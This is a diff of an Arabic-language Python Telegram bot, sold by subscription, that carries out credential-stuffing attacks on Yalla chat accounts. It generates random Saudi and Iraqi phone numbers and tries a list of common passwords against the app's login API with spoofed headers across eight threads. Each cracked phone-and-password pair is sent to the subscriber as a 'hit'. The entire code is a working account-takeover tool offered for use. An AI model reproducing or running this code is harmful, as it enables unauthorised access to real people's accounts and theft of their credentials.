@@ -60,27 +60,11 @@ CODES  = {
 }
 
 DEFAULT_PASSWORDS = [
-    'Aa123123123',
-    'Aa12312300',
-    'Aa10002000',
-    'Aa100200300',
-    'Aa100200',
-    'Aa10203040',
-    'Aa102030',
-    'As123123',
-    'Aa11223344',
     'Aa123456',
     'Aa12345678',
-    'Ali112233',
-    'Aa123456789',
-    'Ali100200',
-    'Ali20002000',
-    'Ahmed100200',
-    'Ahmad123123',
-    'qwer1234',
-    'qwer4321',
-    'q1w2e3r4',
-    '1q2w3e4r',
+    'Aa12312300',
+    'Aa123123',
+    'Aa11223300',
 ]
 
 # دالة الجلسات لكل خيط لضمان السرعة ومنع تداخل الاتصالات
@@ -132,11 +116,11 @@ def is_user_active(user_id: int) -> bool:
             return True
     return False
 
-# قاموس لتتبع حالة الفحص الخاصة بكل مستخدم بشكل معزول تماماً
+# قاموس لتتبع حالة الفحص الخاصة بكل مستخدم بشكل مستقل تماماً
 user_active_scans: dict = {}
 
 # ==================== دالة تسجيل الدخول (LightKVD) ====================
-def _do_login(phone: str, pw: str, region: int = 964, timeout: int = 20) -> dict:
+def _do_login(phone: str, pw: str, region: int = 966, timeout: int = 20) -> dict:
     session = get_session()
     dname, model = rdev()
     _uid     = str(uuid.uuid4())
@@ -180,7 +164,7 @@ def _do_login(phone: str, pw: str, region: int = 964, timeout: int = 20) -> dict
         "origin":           "https://api.lightkvd.com",
         "x-requested-with": "com.yalla.yallagames",
         "referer":          "https://api.lightkvd.com/login",
-        "accept-language":  "ar-SA,ar;q=0.9,en-US;q=0.8,en-ąp;q=0.7",
+        "accept-language":  "ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7",
         "Cookie":           f"cna={uuid.uuid4().hex[:16]}",
     }
     
@@ -206,40 +190,30 @@ def _do_login(phone: str, pw: str, region: int = 964, timeout: int = 20) -> dict
     except Exception as e:
         return {"status": "ERROR", "message": str(e), "dev": {"name": dname, "model": model}}
 
-# توليد أرقام تلقائية للعراق (964) والسعودية (966) بشكل عشوائي مستقل
-def generate_random_phone_and_region():
-    if random.choice([True, False]):
-        region = 964
-        prefixes = ["770", "771", "772", "773", "774", "775", "780", "781", "782", "783", "750", "751", "790"]
-        phone = random.choice(prefixes) + "".join([str(random.randint(0, 9)) for _ in range(7)])
-        country_name = "العراق 🇮🇶"
-    else:
-        region = 966
-        prefixes = ["50", "53", "55", "54", "56", "57", "58", "59"]
-        phone = random.choice(prefixes) + "".join([str(random.randint(0, 9)) for _ in range(7)])
-        country_name = "السعودية 🇸🇦"
-    return phone, region, country_name
+def generate_random_phone():
+    prefixes = ["50", "53", "55", "56", "54", "58", "59"]
+    return random.choice(prefixes) + "".join([str(random.randint(0, 9)) for _ in range(7)])
 
 # ==================== واجهات الأزرار (Keyboards) ====================
 def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("بدء الفحص", callback_data="start_scan"))
-    markup.add(InlineKeyboardButton("تفاصيل الاشتراك", callback_data="my_sub"))
+    markup.add(InlineKeyboardButton("🚀 بدء الفحص التلقائي (LightKVD)", callback_data="start_scan"))
+    markup.add(InlineKeyboardButton("📊 حالة اشتراكي", callback_data="my_sub"))
     if user_id == ADMIN_ID:
-        markup.add(InlineKeyboardButton("اعدادات البوت", callback_data="admin_panel"))
+        markup.add(InlineKeyboardButton("⚙️ لوحة تحكم المطور", callback_data="admin_panel"))
     return markup
 
 def get_scanning_keyboard() -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("ايقاف الفحص", callback_data="stop_scan"))
+    markup.add(InlineKeyboardButton("⏹️ إيقاف الفحص", callback_data="stop_scan"))
     return markup
 
 def get_admin_keyboard() -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("تفعيل مشترك", callback_data="admin_add"))
-    markup.add(InlineKeyboardButton("حذف مشترك", callback_data="admin_del"))
-    markup.add(InlineKeyboardButton("المشتركين الكلي", callback_data="admin_list"))
-    markup.add(InlineKeyboardButton("رجوع", callback_data="main_menu"))
+    markup.add(InlineKeyboardButton("➕ تفعيل مستخدم", callback_data="admin_add"))
+    markup.add(InlineKeyboardButton("❌ حذف مستخدم", callback_data="admin_del"))
+    markup.add(InlineKeyboardButton("📋 قائمة المشتركين", callback_data="admin_list"))
+    markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="main_menu"))
     return markup
 
 # ==================== معالجة أوامر التلغرام ====================
@@ -247,11 +221,12 @@ def get_admin_keyboard() -> InlineKeyboardMarkup:
 def cmd_start(message):
     user_id = message.from_user.id
     if not is_user_active(user_id):
-        bot.reply_to(message, "انت غير مشترك راسل المطور @aboodriad")
+        bot.reply_to(message, "❌ عذراً، لا تمتلك اشتراكاً فعالاً لاستخدام هذا البوت. تواصل مع المطور للتفعيل.")
         return
     
     welcome_text = (
-        "<b>مرحبا بك عزيزي\nلوحة المشترك الخاصة\nاختصاص فحص حسابات يلا شات داخلي (العراق 🇮🇶 & السعودية 🇸🇦)\n\nقم بتشغيل البوت من خلال بدء الفحص</b>"
+        "<b>مرحباً بك في بوت فحص حسابات يالا (LightKVD Engine) 🌟</b>\n\n"
+        "اختر من الأزرار أدناه للبدء:"
     )
     bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))
 
@@ -263,7 +238,7 @@ def handle_callbacks(call):
 
     if not is_user_active(user_id) and call.data != "my_sub":
         try:
-            bot.answer_callback_query(call.id, "الاشتراك منتهي (:", show_alert=True)
+            bot.answer_callback_query(call.id, "❌ انتهى اشتراكك أو أنك غير مسجل.", show_alert=True)
         except Exception:
             pass
         return
@@ -272,7 +247,7 @@ def handle_callbacks(call):
         if user_id in user_active_scans:
             user_active_scans[user_id]["running"] = False
         try:
-            bot.edit_message_text("<b>مرحبا بك عزيزي\nلوحة المشترك الخاصة\nاختصاص فحص حسابات يلا شات داخلي (العراق 🇮🇶 & السعودية 🇸🇦)\n\nقم بتشغيل البوت من خلال بدء الفحص</b>", chat_id, message_id, reply_markup=get_main_keyboard(user_id))
+            bot.edit_message_text("<b>القائمة الرئيسية:</b>", chat_id, message_id, reply_markup=get_main_keyboard(user_id))
         except Exception:
             pass
 
@@ -280,16 +255,16 @@ def handle_callbacks(call):
         subs = load_subscriptions()
         str_uid = str(user_id)
         if user_id == ADMIN_ID:
-            sub_status = "انت مدير البوت"
+            sub_status = "مدير البوت (صلاحيات كاملة 👑)"
         elif str_uid in subs and time.time() < subs[str_uid]:
             rem_days = int((subs[str_uid] - time.time()) / 86400)
-            sub_status = f"الاشتراك الخاص بك : {rem_days} يوم"
+            sub_status = f"فعال ✅ (متبقي {rem_days} يوم)"
         else:
             sub_status = "غير فعال ❌"
         
-        text = f"<b>معلومات حسابك :</b>\nالآيدي : <code>{user_id}</code>\n📌 الحالة : {sub_status}"
+        text = f"👤 <b>معلومات حسابك:</b>\n🆔 الآيدي: <code>{user_id}</code>\n📌 الحالة: {sub_status}"
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("رجوع", callback_data="main_menu"))
+        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="main_menu"))
         try:
             bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
         except Exception:
@@ -298,7 +273,7 @@ def handle_callbacks(call):
     elif call.data == "start_scan":
         if user_id in user_active_scans and user_active_scans[user_id].get("running"):
             try:
-                bot.answer_callback_query(call.id, "عملية الفحص تعمل لديك بالفعل!", show_alert=True)
+                bot.answer_callback_query(call.id, "⚠️ عملية الفحص تعمل لديك بالفعل!", show_alert=True)
             except Exception:
                 pass
             return
@@ -308,41 +283,34 @@ def handle_callbacks(call):
         except Exception:
             pass
 
-        # توليد معرف جلسة فريد ومستقل لهذه الواجهة
-        session_id = uuid.uuid4().hex[:6].upper()
-
         scan_msg = bot.send_message(
             chat_id,
-            f"<b>🚀 واجهة الفحص الخاصة بك (نشطة)</b>\n"
-            f"🆔 <b>معرف الجلسة:</b> <code>{session_id}</code>\n\n"
-            f"<b>الدول المفحوصة:</b> العراق 🇮🇶 & السعودية 🇸🇦\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"تم صيد : 0\n"
-            f"غير مسجل : 0\n"
-            f"الاخطاء : 0",
+            "🚀 <b>جاري بدء الفحص السريع (LightKVD)...</b>\n\n"
+            "✅ صيد صحيح (VALID): 0\n"
+            "🚫 غير مسجل: 0\n"
+            "⚠️ أخطاء/أخرى: 0",
             reply_markup=get_scanning_keyboard()
         )
 
-        # عزل حالة المستخدم بالكامل مع بصمة الجلسة الخاصة به
+        # تهيئة عزل الحالة الخاصة بهذا المستخدم حصرياً
         user_active_scans[user_id] = {
             "running": True,
-            "session_id": session_id,
             "valid": 0,
             "not_registered": 0,
             "error": 0,
             "message_id": scan_msg.message_id
         }
 
-        # تشغيل خيوط الفحص المستقلة الخاصة بالمستخدم فقط
-        threading.Thread(target=run_user_scanner, args=(user_id, chat_id, scan_msg.message_id, session_id), daemon=True).start()
+        # تشغيل خيوط الفحص المستقلة للمستخدم
+        threading.Thread(target=run_user_scanner, args=(user_id, chat_id, scan_msg.message_id), daemon=True).start()
 
     elif call.data == "stop_scan":
         if user_id in user_active_scans:
             user_active_scans[user_id]["running"] = False
         try:
-            bot.answer_callback_query(call.id, "تم إيقاف الفحص")
+            bot.answer_callback_query(call.id, "⏹️ تم إيقاف الفحص.")
             bot.edit_message_text(
-                "<b>تم إيقاف عملية الفحص الخاصة بك بنجاح وإغلاق الجلسة.</b>",
+                "⏹️ <b>تم إيقاف عملية الفحص الخاصة بك بنجاح.</b>",
                 chat_id, message_id,
                 reply_markup=get_main_keyboard(user_id)
             )
@@ -388,32 +356,30 @@ def handle_callbacks(call):
         except Exception:
             pass
 
-# ==================== خيوط الفحص المعزولة كلياً لكل مستخدم ====================
-def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int, session_id: str):
-    max_threads = 8  # عدد الخيوط لكل مستخدم
+# ==================== خيوط الفحص المعزولة للمستخدم ====================
+def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
+    region = 966
+    max_threads = 8  # عدد الخيوط لكل مستخدم لضمان السرعة
 
     def worker():
-        while user_id in user_active_scans and user_active_scans[user_id]["running"] and user_active_scans[user_id]["session_id"] == session_id:
-            phone, region, country_name = generate_random_phone_and_region()
+        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
+            phone = generate_random_phone()
             first_pw = DEFAULT_PASSWORDS[0]
             
             try:
                 res = _do_login(phone, first_pw, region)
                 st = res.get("status", "ERROR")
             except Exception:
-                if user_id in user_active_scans and user_active_scans[user_id]["session_id"] == session_id:
+                if user_id in user_active_scans:
                     user_active_scans[user_id]["error"] += 1
                 continue
 
             if st == "NOT_REGISTERED":
-                if user_id in user_active_scans and user_active_scans[user_id]["session_id"] == session_id:
+                if user_id in user_active_scans:
                     user_active_scans[user_id]["not_registered"] += 1
                 continue
 
             for pw in DEFAULT_PASSWORDS:
-                if not (user_id in user_active_scans and user_active_scans[user_id]["running"] and user_active_scans[user_id]["session_id"] == session_id):
-                    break
-
                 if pw != first_pw:
                     try:
                         res = _do_login(phone, pw, region)
@@ -422,16 +388,17 @@ def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int, session_id: s
                         break
 
                 if st == "VALID":
-                    if user_id in user_active_scans and user_active_scans[user_id]["session_id"] == session_id:
+                    if user_id in user_active_scans:
                         user_active_scans[user_id]["valid"] += 1
                     
-                    # تنبيه الصيد الخاص بهذا المستخدم مع بيانات الجلسة والدولة
+                    # إرسال تنبيه الصيد للمستخدم مباشرة
                     alert_text = (
-                        f"<b>🎉 تم صيد حساب يلا شات ({country_name})</b>\n"
-                        f"🆔 <b>معرف الجلسة:</b> <code>{session_id}</code>\n\n"
-                        f"<b>Phone :</b> +{region}{phone}\n"
-                        f"<b>Password :</b> {pw}\n"
-                        f"By : @aboodriad"
+                        f"🚨 <b>New Yalla Hit Found!</b> 🚨\n\n"
+                        f"📱 <b>Phone :</b> `+{region}{phone}`\n"
+                        f"🔑 <b>Password :</b> `{pw}`\n"
+                        f"🌍 Region : {region}\n"
+                        f"ℹ️ Status : {res.get('message', 'VALID')}\n"
+                        f"🤖 By : Bot System"
                     )
                     try:
                         bot.send_message(chat_id, alert_text)
@@ -439,29 +406,26 @@ def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int, session_id: s
                         pass
                     break
                 elif st == "ERROR" or st == "RATE_LIMITED":
-                    if user_id in user_active_scans and user_active_scans[user_id]["session_id"] == session_id:
+                    if user_id in user_active_scans:
                         user_active_scans[user_id]["error"] += 1
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         for _ in range(max_threads):
-            if user_id in user_active_scans and user_active_scans[user_id]["running"] and user_active_scans[user_id]["session_id"] == session_id:
+            if user_id in user_active_scans and user_active_scans[user_id]["running"]:
                 executor.submit(worker)
 
         last_text = ""
-        while user_id in user_active_scans and user_active_scans[user_id]["running"] and user_active_scans[user_id]["session_id"] == session_id:
+        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
             state = user_active_scans[user_id]
             v = state["valid"]
             nr = state["not_registered"]
             e = state["error"]
 
             status_text = (
-                f"<b>🚀 واجهة الفحص الخاصة بك (نشطة)</b>\n"
-                f"🆔 <b>معرف الجلسة:</b> <code>{session_id}</code>\n\n"
-                f"<b>الدول المفحوصة:</b> العراق 🇮🇶 & السعودية 🇸🇦\n"
-                f"━━━━━━━━━━━━━━━━━━\n"
-                f"تم صيد : {v}\n"
-                f"غير مسجل : {nr}\n"
-                f"الاخطاء : {e}"
+                f"🚀 <b>جاري فحص الحسابات (LightKVD) بشكل سريع ومستقل...</b>\n\n"
+                f"✅ صيد صحيح (VALID): {v}\n"
+                f"🚫 غير مسجل: {nr}\n"
+                f"⚠️ أخطاء/أخرى: {e}"
             )
 
             if status_text != last_text:
@@ -511,7 +475,7 @@ def process_del_sub(message):
 
 # ==================== تشغيل البوت مع نظام منع التوقف (Auto-Reconnect) ====================
 if __name__ == "__main__":
-    print("🤖 LightKVD Telegram Bot is running with Isolated Sessions per User...")
+    print("🤖 LightKVD Telegram Bot is running with Auto-Reconnect & Isolated UIs...")
     while True:
         try:
             bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
